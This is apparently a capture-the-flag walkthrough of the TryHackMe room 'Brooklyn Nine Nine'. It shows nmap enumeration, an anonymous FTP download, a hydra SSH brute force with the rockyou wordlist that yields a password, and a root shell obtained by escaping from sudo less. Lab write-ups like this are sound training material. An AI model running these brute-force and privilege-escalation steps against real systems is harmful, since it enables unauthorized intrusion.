# Brooklyn Nine Nine (THM)

- https://tryhackme.com/room/brooklynninenine
- March 4, 2023
- easy

---

## Enumeration

- Nmap Initial

1. 21/ftp vsftpd 3.0.3
   - anonymous FTP login allowed
   - -rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt
2. 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3. 80/http Apache/2.4.29

### ftp

- get one text file

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

### http

- http://$IP
- found an image and in view page source

```
<!-- Have you ever heard of steganography? -->
```

- directory brute forcing with ffuf
- nothing special found

- get the image

### ssh

- from Amy text, brute force jake's ssh password

```
$ hydra -l jake -P /usr/share/wordlists/rockyou.txt $IP ssh -t 4
login: jake   password: 987654321
```

# Get User Access

```sh
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

jake@brookly_nine_nine:~$ cat /home/holt/user.txt

# read the /root/root.text with less command
jake@brookly_nine_nine:~$ sudo less /root/root.txt

# OR
jake@brookly_nine_nine:~$ sudo less /etc/profile
!/bin/bash
root@brookly_nine_nine:~# whoami
root
```

---
